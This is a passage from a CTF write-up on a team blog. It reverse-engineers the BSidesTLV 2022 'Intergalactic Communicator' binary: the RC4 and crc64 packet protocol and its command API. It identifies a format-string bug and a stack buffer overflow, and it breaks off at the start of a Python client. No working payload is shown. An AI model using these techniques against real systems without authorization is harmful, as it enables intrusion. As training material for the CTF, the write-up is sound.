<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>BSidesTLV 2022 CTF – Intergalactic Communicator</title><meta name="robots" content="follow, index"/><meta name="description" content="pwn too easy, rev cancer."/><meta property="og:url" content="https://sekai.team/blog/bsidestlv-2022/intergalactic_communicator/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="pwn too easy, rev cancer."/><meta property="og:title" content="BSidesTLV 2022 CTF – Intergalactic Communicator"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=BSidesTLV+2022+CTF+%E2%80%93+Intergalactic+Communicator&amp;desc=pwn+too+easy%2C+rev+cancer.&amp;authors=TheBadGod"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="BSidesTLV 2022 CTF – Intergalactic Communicator"/><meta name="twitter:description" content="pwn too easy, rev cancer."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=BSidesTLV+2022+CTF+%E2%80%93+Intergalactic+Communicator&amp;desc=pwn+too+easy%2C+rev+cancer.&amp;authors=TheBadGod"/><meta property="article:published_time" content="2022-06-30T00:00:00.000Z"/><link rel="canonical" href="https://spclr.ch/bsidestlv2022-writeups"/><link rel="canonical" href="https://sekai.team/blog/bsidestlv-2022/intergalactic_communicator/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/bsidestlv-2022/intergalactic_communicator"
  },
  "headline": "BSidesTLV 2022 CTF – Intergalactic Communicator",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=BSidesTLV+2022+CTF+%E2%80%93+Intergalactic+Communicator&desc=pwn+too+easy%2C+rev+cancer.&authors=TheBadGod"
    }
  ],
  "datePublished": "2022-06-30T00:00:00.000Z",
  "dateModified": "2022-06-30T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "TheBadGod"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "pwn too easy, rev cancer."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_buildManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_ssgManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-06-30T00:00:00.000Z">Thursday, 30 June 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">BSidesTLV 2022 CTF – Intergalactic Communicator</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/17fe95d3ab94df64d28ff20042e58df3?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">TheBadGod</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/HodelAaron" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@HodelAaron</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="intergalactic-communicator-500"><a href="#intergalactic-communicator-500" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Intergalactic Communicator (500)</h2>
<p>We get a tar gz archive with a docker container inside (An archived docker
container), the main thing inside we are interested in is the binary running
on the remote, so we either import the docker container or extract the layers
until we find the binary in <code>/usr/src/app/main</code>.</p>
<h2 id="part-1-reversing"><a href="#part-1-reversing" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Part 1: Reversing</h2>
<h3 id="header--checksum"><a href="#header--checksum" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Header &amp; checksum</h3>
<p>The binary inside the docker container is statically compiled and stripped,
so it must be a hard challenge (as it turns out it actually isn&#x27;t, it&#x27;s just
cancerous).</p>
<p>We start at the function start (entrypoint) inside the binary, this calls
<code>libc_start_main</code>, where the first argument is the main function, going into
that we see that it runs an infinite loop and if it breaks it prints
&quot;invalid packet&quot;, making an educated guess and saying that that function
probably is <code>fwrite</code>, the next one after that probably is <code>exit</code>, then
there are only three more functions, the first of which looks like a memset
call, to set a buffer of size 2048 to zero, the second one looks like fread
(Again looking at the arguments and seeing the stdin in fourth place).</p>
<p>So we read four bytes, put that into a variable, then swap the endianess
of said variable, if that value is now less than 12 we print &quot;invalid
protocol header&quot;, so we have 12 bytes of header data, next we read the
amount of bytes specified by our input. So this input must have been
the packet length, the rest of the data is the payload.</p>
<p>This also means the last remaining function is the function responsible
for handling the packet data, it gets the packet data and its size.
In that function we load the first eight bytes of the data, xor it
with two different values and store those in a 16 byte buffer (The constants
spell out <code>NotFlag!</code> and <code>JustKey!</code> respectively, so I name the buffer key).
next we call a function where we give this buffer as first argument, then
the packet data (after the first eight bytes), then 16 and finally the packet
length minus eight. So we are entering the key and data and their sizes.</p>
<p>Looking at that function we see a few assertions (including file name, line
number and function name &amp; arguments), so we can already name all of those.
If you&#x27;ve ever reversed malware (or some &quot;secure&quot; c2 server), this encryption
might look familiar, as it is just doing rc4 encryption. It mallocs a new buffer
for the output and returns a pointer to that.</p>
<p>Back in the function handling the packet we call memset on the packet data again,
then a function which takes the packet data pointer, the decrypted data pointer
and the size of the data, so this is probably just a memcpy. Then we clear the
allocated buffer and call free on it (Actually I didn&#x27;t reverse that function, I
again just guessed it probably is free, since we don&#x27;t use the buffer afterwards).</p>
<p>Next we have an if which checks that the output of a function, which takes the
data and its size, is equal to the first eight bytes of the packet - which we
used as the key for the decryption. If the check fails, we print &quot;checksum failed&quot;
and exit, so this makes it pretty clear that we&#x27;re using some sort of checksum.
Looking at the function we see that there is a lookuptable. Googling the first
(nonzero) constant in that table leads us to the crc64 implementation of
redis which looks exactly like the implementation we got. So either we implement
this in python or we write the exploit in C and use this implementation...
Or we just use pwntools <code>generic_crc</code> which will work the same as this implementation
by just giving it the arguments which are defined at the top of the redis
implementation.</p>
<p>Next, if the checksum was correct, the packet data (without the checksum header)
is passed into another function, which then first takes an int from the data
(Finalizing the header) and performs a switch on the value of that, there
are five actions we can perform, it seems that the first one just prints a
number, so we change the function call with the format specified to <code>sprintf</code>,
the buffer we write into is used after the switch, first we put it into a
function which returns an int, which we send to the other side using fwrite,
then we pass the buffer into a second function. This looks like we&#x27;re just
sending the size of the buffer and then the buffer, so I rename the functions
to <code>strlen</code> and <code>write_buffer</code> and the buffer to <code>output_data</code> respectively.
(I ignored the first if case in the function as it had to with futexes and
those are rarely important).</p>
<h3 id="api"><a href="#api" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>API</h3>
<p>So now we know how to communicate (and we can already write a script to
communicate which just sends packets and receives the answer), however
the interesting part starts now as we have to reverse the actual part
we can interact with, so let&#x27;s look at the switch.</p>
<p>The first case just returns a numberm which is the result of a function
call with an object which seems to be referenced a lot.</p>
<p>The second case takes another int from the input data, puts it into
a function together with the weird object. Then we call a function
which just dereferences the returned value. Venturing a bit into the
first function we find the string <code>vector::_M_range_check</code>, which means
the object is likely just a vector and judging by the arguments this is
probably just the <code>operator[]</code>, the returned value is dereferenced, which
leads me to believe that it&#x27;s a c++ string and we called the <code>c_str</code> method
on it. Considering this, we now can make a guess about the first case in
the switch, that being it&#x27;s just getting the size of the vector.
Next we call <code>snprintf</code> (again based on the arguments), into a temporary
buffer, then we call some other method which again calls printf??
Yes as it looks like the temporary buffer is used as the format for
a printf to the output buffer... Well, if that&#x27;s not handy...</p>
<p>The next case takes the rest of the buffer as a string (<code>char*</code>) and
calls another function with it, which probably means it&#x27;s inserting
that into the list. Then we get the iterator and end iterator of that
returned string, then we clear the topmost bit of every char along the
way (We iterate over all the chars we just put into the string)
This is likely to limit us to ascii-only values, but we&#x27;ll see about that</p>
<p>The fourth case just calls a function and returns &quot;OK&quot;, my guess was this
clears the list and with a bit of experimenting that seemed to be the
case (not that I had to use this functionality)</p>
<p>The last case is again using an iterator, this time over the string in the
list, and it just concatenates them all into a giant string, which is
on the stack... In a buffer of size 2048... Where every string can
have up to 2048 chars... So yeah, this could be used to overflow the stack
quite a bit.</p>
<h3 id="implementation"><a href="#implementation" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Implementation</h3>
<p>I implemented this protocol client in python:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line"><span class="token keyword">from</span> arc4 <span class="token keyword">import</span> ARC4
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">class</span> <span class="token class-name">Comm</span><span class="token punctuation">:</span>
</span><span class="code-line">    crc64 <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> crc<span class="token punctuation">.</span>generic_crc<span class="token punctuation">(</span>polynom<span class="token operator">=</span><span class="token number">0xad93d23594c935a9</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>refin<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>refout<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>xorout<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>init<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>data<span class="token operator">=</span>x<span class="token punctuation">)</span>
</span><span class="code-line">
